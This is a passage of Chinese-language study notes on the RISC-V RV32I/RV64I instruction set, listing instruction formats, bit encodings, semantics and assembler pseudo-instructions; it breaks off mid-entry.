\u4e34\u65f6\u53d8\u91cf caller \u5176\u4e2d sp s0-11 \u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u8bc1\u4e00\u81f4\uff0c\u5176\u5b83\u4e0d\u7528\u4fdd\u8bc1 \u6307\u4ee4\u683c\u5f0f \u00b6 RV32I \u6709 4 \u79cd\u57fa\u7840\u7684\u6307\u4ee4\u683c\u5f0f\uff08R/I/S/U\uff09\uff0c\u518d\u6839\u636e\u7acb\u5373\u6570\u89e3\u7801\u7684\u4e0d\u540c\u53c8\u5206\u51fa\u4e24\u79cd\uff08B/J\uff09\uff0c\u603b\u5171\u516d\u79cd\u6307\u4ee4\u683c\u5f0f R \u578b\u6307\u4ee4 \u00b6 31 25 24 20 19 15 14 12 11 7 6 0 funct7 rs2 rs1 funct3 rd opcode \u4f7f\u7528\u5bc4\u5b58\u5668\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7531 opcode funct3 funct7 \u51b3\u5b9a\uff0crd = rs1 op rs2\uff08shift \u7c7b\u4f8b\u5916\uff0c\u5b83\u4eec\u7528 rs2 \u4f4d\u7f6e\u8868\u793a\u79fb\u4f4d\u6570\u7684\u7acb\u5373\u6570\uff09 I \u578b\u6307\u4ee4 \u00b6 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 funct3 rd opcode \u4f7f\u7528\u5bc4\u5b58\u5668\u548c\u7acb\u5373\u6570\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\uff0c\u4ee5\u53ca load \u7c7b\u6307\u4ee4\u7b49\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7c7b\u578b\u7b49\u7531 opcode funct3 \u51b3\u5b9a\uff0c\u5982\u679c\u662f ALU \u8fd0\u7b97\uff0c\u5219 rd = rs1 op imm \u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:20]}\uff0c\u4e5f\u5c31\u662f\u5bf9 imm[11:0] \u8fdb\u884c\u7b26\u53f7\u4f4d\u6269\u5c55\u5230 32 \u4f4d S \u578b\u6307\u4ee4 \u00b6 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 funct3 imm[4:0] opcode store \u7c7b\u6307\u4ee4\uff0cstore \u7684\u5927\u5c0f\u7531 funct3 \u51b3\u5b9a\uff0c\u4ee5\u53d8\u5740\u6a21\u5f0f\u8fdb\u884c\u5bfb\u5740\uff0c\u5373 rs1 = [rs2+imm] \u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:25], inst[11:7]} B \u578b\u6307\u4ee4 \u00b6 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 funct3 imm[4:1,11] opcode \u7531 S \u578b\u6307\u4ee4\u5206\u6765\uff0c\u4e0e\u4e4b\u533a\u522b\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u987a\u5e8f\u4e0d\u540c\uff0c\u662f\u6240\u6709\u5206\u652f\u7c7b\u6307\u4ee4\u3002\u662f\u5426\u5206\u652f\u7531 funct3 rs1 rs2 \u51b3\u5b9a \u7acb\u5373\u6570\u662f {{19{inst[31]}}, inst[31], inst[7], inst[30:25], inst[11:8], 1'b0} U \u578b\u6307\u4ee4 \u00b6 31 12 11 7 6 0 imm[31:12] rd opcode LUI \u548c AUIPC\uff0c\u7acb\u5373\u6570\u90fd\u662f\u5728\u9ad8 20 \u4f4d\uff0c\u800c\u4e14\u6ca1\u6709\u6e90\u64cd\u4f5c\u6570 \u7acb\u5373\u6570\u662f {inst[31:12], 12'b0} J \u578b\u6307\u4ee4 \u00b6 31 12 11 7 6 0 imm[20,10:1,11,19:12] rd opcode \u7531 U \u578b\u6307\u4ee4\u5206\u6765\uff0c\u533a\u522b\u4e5f\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u4e0d\u540c\uff0c\u4ec5\u6709 JAL \u4e00\u4e2a\u6307\u4ee4 \u7acb\u5373\u6570\u662f {{11{inst[31]}}, inst[31], inst[19:12], inst[20], inst[30:21], 1'b0} RV32I \u6307\u4ee4 \u00b6 \u6574\u578b\u8ba1\u7b97\u6307\u4ee4 \u00b6 \u52a0\u51cf\u6cd5\u6307\u4ee4 \u00b6 add R \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aadd rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 + rs2 \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565 sub r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asub rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 - rs2 \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565 addi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aaddi rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 + imm \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565\uff0cimm \u5728 [-2048, 2047] \u8303\u56f4\u5185 \u6bd4\u8f83\u8fd0\u7b97\u6307\u4ee4 \u00b6 slt r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 010 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aslt rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than\uff09\u5982\u679c rs1 < rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 sltu r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 011 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asltu rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than unsigned\uff09\u5982\u679c rs1 < rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 slti I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslti rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than immediate\uff09\u5982\u679c rs1 < imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 sltiu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asltiu rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than immediate unsigned\uff09\u5982\u679c rs1 < imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0crs1 imm \u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 \u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u6307\u4ee4 \u00b6 and r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 111 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aand rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 & rs2 \u6309\u4f4d\u4e0e or r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 110 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aor rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 | rs2 \u6309\u4f4d\u6216 xor r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 100 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1axor rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 ^ rs2 \u6309\u4f4d\u5f02\u6216 andi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 111 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aandi rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 & imm \u6309\u4f4d\u4e0e \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d ori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 110 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aori rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 | imm \u6309\u4f4d\u6216 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d xori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1axori rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 ^ imm \u6309\u4f4d\u5f02\u6216 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d\uff08xori rd, rs1, -1 \u76f8\u5f53\u4e8e rd = ~rs1\uff09 \u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4 \u00b6 sll r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asll rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 << rs2[4:0] \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u6570\u503c\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97 srl r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asrl rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >> rs2[4:0] \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d sra r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asra rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >>> rs2[4:0] \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97 slli i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 << shamt \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d srli i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >> shamt \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d srai i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrai rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >>> shamt \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d \u6570\u636e\u52a0\u8f7d\u6307\u4ee4 \u00b6 lui U \u578b 31 12 11 7 6 0 imm[31:12] rd 0110111 \u6307\u4ee4\u683c\u5f0f \uff1alui imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08load upper immediate\uff09rd = imm << 12 \u5c06 imm \u52a0\u8f7d\u5230 rd \u7684\u9ad8 20 \u4f4d \u6ce8\u610f \uff1aimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d\uff0crd \u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u5c31\u662f imm \u540e\u63a5\u4e09\u4e2a 0 auipc U \u578b 31 12 11 7 6 0 imm[31:12] rd 0010111 \u6307\u4ee4\u683c\u5f0f \uff1aauipc rd \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08add upper immediate with pc\uff09rd = pc + imm << 12 \u5c06 imm \u52a0\u8f7d\u5230\u9ad8 20 \u4f4d\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c \u6ce8\u610f \uff1a\u5e38\u7528\u6765\u6784\u5efa pc \u76f8\u5bf9\u5bfb\u5740\u7684\u5730\u5740\uff0cimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d \u63a7\u5236\u6d41\u53d8\u5316\u6307\u4ee4 \u00b6 jump \u7c7b\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 jal J \u578b 31 12 11 7 6 0 imm[20,10:1,11,19:12] rd 1101111 \u6307\u4ee4\u683c\u5f0f \uff1ajal rd, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08jump and link\uff09rd = pc+4, pc = pc+imm \u5373\u5c06\u5f53\u524d\u6307\u4ee4\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5b58\u5165 rd\uff0c\u7136\u540e\u76f8\u5bf9\u8df3\u8f6c\u5230 imm \u5904 \u6ce8\u610f \uff1aimm \u5728\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u4e00\u822c\u7528\u6807\u53f7\u6765\u6307\u5b9a\uff0cjal \u53ef\u4ee5\u8df3\u5230 \u00b11MiB \u8303\u56f4\u5185\u7684\u4ee3\u7801 jalr I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 1100111 \u6307\u4ee4\u683c\u5f0f \uff1ajalr rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1ard = pc+4, pc = (imm+rs1) & 0xFFFFFFFE \u5373\u6700\u4f4e\u4f4d\u4f1a\u88ab\u8bbe\u4e3a 0 \u6ce8\u610f \uff1a\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u4f4d\u7f6e\u8df3\u8f6c branch \u7c7b\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 beq B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 000 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abeq rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if equal\uff09\u5982\u679c rs1 == rs2\uff0c\u5219 pc = pc+imm \u6ce8\u610f \uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bne B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 001 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abne rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if not equal\uff09\u5982\u679c rs1 != rs2\uff0c\u5219 pc = pc+imm \u6ce8\u610f \uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 blt B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 100 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1ablt rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if less than\uff09\u5982\u679c rs1 < rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bge B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 101 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abge rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if greater than or equal\uff09\u5982\u679c rs1 >= rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bltu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 110 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abltu rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08blt unsigned\uff09\u5982\u679c rs1 < rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bgeu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 111 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abgeu rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08bge unsigned\uff09\u5982\u679c rs1 >= rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 \u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4 \u00b6 load \u7c7b\u88c5\u8f7d\u6307\u4ee4 \u00b6 lb I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alb rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5230 rd \u4f4e\u516b\u4f4d\uff0c\u518d\u8fdb\u884c\u7b26\u53f7\u6269\u5c55 lh I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 001 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alh rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 16 \u4f4d\u6570\u5230 rd \u4f4e 16 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u7b26\u53f7\u6269\u5c55 lw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alw rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d lbu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1albu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u653e\u5230 rd \u4f4e 8 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8\u4f4d\u5168\u8865 0\uff09 lhu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 101 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alhu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6 16 \u4f4d\u6570\u5b58\u5165 rd\uff0c\u5e76\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8 16 \u4f4d\u5168\u4e3a 0\uff09 store \u7c7b\u5b58\u50a8\u6307\u4ee4 \u00b6 sb S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 000 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asb rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2 \u7684\u4f4e 8 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d sh S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 001 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1ash rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2 \u7684\u4f4e 16 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d sw S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 010 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asw rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2\uff0832 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d \u73af\u5883\u8c03\u7528\u548c\u65ad\u70b9\u6307\u4ee4 \u00b6 ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aecall \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bf7\u6c42\u73af\u5883\u8c03\u7528\uff08\u7c7b\u4f3c syscall\uff09\uff0cEEI \u4f1a\u5b9a\u4e49\u76f8\u5173\u53c2\u6570\u89c4\u8303\uff08\u4e00\u822c\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u53c2\uff09 ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aebreak \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u63a7\u5236\u6d41\u8f6c\u5230\u8c03\u8bd5\u73af\u5883 \u6c47\u7f16\u4f2a\u6307\u4ee4 \u00b6 \u524d\u9762\u7684\u662f RV32I \u7684\u6240\u6709\u88ab\u7f16\u7801\u7684\u6307\u4ee4\uff0c\u4e0b\u9762\u662f\u53ef\u4ee5\u5728 RV32I \u6c47\u7f16\u7a0b\u5e8f\u4e2d\u5199\u7684\u4f2a\u6307\u4ee4\uff0c\u5b83\u4eec\u5c06\u88ab\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u7b2c\u4e8c\u5217\u4e2d\u7684\u5b9e\u9645\u6307\u4ee4 .small-table table { font-size: 0.55rem !important; } \u4f2a\u6307\u4ee4 \u5b9e\u9645\u6307\u4ee4 \u610f\u4e49 la/lla rd, symbol auipc rd, delta[31 : 12] + delta[11] addi rd, rd, delta[11:0] \u52a0\u8f7d\u7edd\u5bf9\u5730\u5740 delta = symbol - pc l{b|h|w} rd, symbol auipc rd, delta[31 : 12] + delta[11] l{b|h|w} rd, delta[11:0](rd) \u52a0\u8f7d\u5168\u5c40\u53d8\u91cf s{b|h|w} rd, symbol, rt auipc rt, delta[31 : 12] + delta[11] s{b|h|w} rd, delta[11:0](rt) \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf nop addi x0, x0, 0 li rd, imm ... \u5c06\u7acb\u5373\u6570\u52a0\u8f7d\u5230 rd \u4e2d mov rd, rs addi rd, rs, 0 \u4ece rs \u62f7\u8d1d\u5230 rd not rd, rs xori rd, rs, -1 rd = ~rs \u6309\u4f4d\u53d6\u53cd neg rd, rs sub rd, x0, rs rd = -rs seqz rd, rs sltiu rd, rs, 1 set rd if rs == 0 snez rd, rs sltu rd, x0, rs set rd if rs != 0 sltz rd, rs slt rd, rs, x0 set rd if rs < 0 sgtz rd, rs slt rd, x0, rs set rd if rs > 0 beqz rs, offset beq rs, x0, offset branch if rs == 0 bnez rs, offset bne rs, x0, offset branch if rs != 0 blez rs, offset bge x0, rs, offset branch if rs <= 0 bgez rs, offset bge rs, x0, offset branch if rs >= 0 bltz rs, offset blt rs, x0, offset branch if rs < 0 bgtz rs, offset blt x0, rs, offset branch if rs > 0 bgt rs, rt, offset blt rt, rs, offset branch if rs > rt ble rs, rt, offset bge rt, rs, offset branch if rs <= rt bgtu rs, rt, offset bltu rt, rs, offset branch if > unsigned bleu rs, rt, offset bgeu rt, rs, offset branch if <= unsigned j offset jal x0, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u4e0d\u5b58\u8fd4\u56de\u5730\u5740 jal offset jal x1, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u8fd4\u56de\u5730\u5740\u5b58\u5230 x1 jr rs jalr x0, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5ffd\u7565\u8fd4\u56de\u5730\u5740 jalr rs jalr x1, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5b58\u8fd4\u56de\u5730\u5740 ret jalr x0, 0(x1) \u901a\u8fc7\u8fd4\u56de\u5730\u5740 x1 \u8fd4\u56de call offset auipc x1, offset[31 : 12] + offset[11] jalr x1, offset[11:0](x1) \u8fdc\u8c03\u7528 tail offset auipc x6, offset[31 : 12] + offset[11] jalr x0, offset[11:0](x6) \u5ffd\u7565\u8fd4\u56de\u5730\u5740\u8fdc\u8c03\u7528 RV64I \u9644\u52a0\u6307\u4ee4 \u00b6 RV64I \u7684\u5bc4\u5b58\u5668\u957f\u5ea6\u548c\u5730\u5740\u7a7a\u95f4\u957f\u5ea6\u90fd\u662f 64 \u4f4d\uff0c\u6307\u4ee4\u957f\u5ea6\u4ecd\u662f 32 \u4f4d\u3002\u9664\u6b64\u4e4b\u5916\u6bd4 RV32I \u591a\u4e86\u4e00\u4e9b\u9488\u5bf9 64/32 \u4f4d\u7684\u6307\u4ee4 \u6574\u578b\u8ba1\u7b97\u6307\u4ee4 \u00b6 32 \u4f4d\u6574\u578b\u8ba1\u7b97 \u00b6 addiw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1aaddiw rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u4e0e imm \u76f8\u52a0\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d \u6ce8\u610f \uff1aaddiw rd, rs1, 0 \u76f8\u5f53\u4e8e\u5c06 rs1 \u4f4e 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d\uff0c\u6c47\u7f16\u4f2a\u4ee3\u7801\u53ef\u5199\u4e3a sext.w rd, rs1 slliw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1aslliw rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u5de6\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd 